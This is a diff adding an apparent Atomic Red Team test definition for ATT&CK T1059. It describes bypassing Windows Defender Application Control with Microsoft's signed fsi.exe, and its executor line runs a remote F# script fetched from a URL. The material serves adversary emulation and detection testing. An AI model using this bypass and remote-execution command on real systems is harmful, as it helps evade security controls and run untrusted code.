@@ -1,0 +1,19 @@
+attack_technique: T1059
+display_name: 'Command and Scripting Interpreter'
+atomic_tests:
+- name: FSI.EXE Application Control Bypass
+
+  description: |
+    fsi.exe is SDK binaries that execute F# to bypass WDAC without block rules applied. Microsoft signed binaries are included with Visual Studio and execute FSharp scripts via interactive command line or through scripts (with .fsx extensions)
+    reference: https://twitter.com/NickTyrer/status/904273264385589248, https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: url of payload to execute
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/src/test.fsscript
+  executor:
+    command: |
+      fsi.exe #{url}
+    name: command_prompt
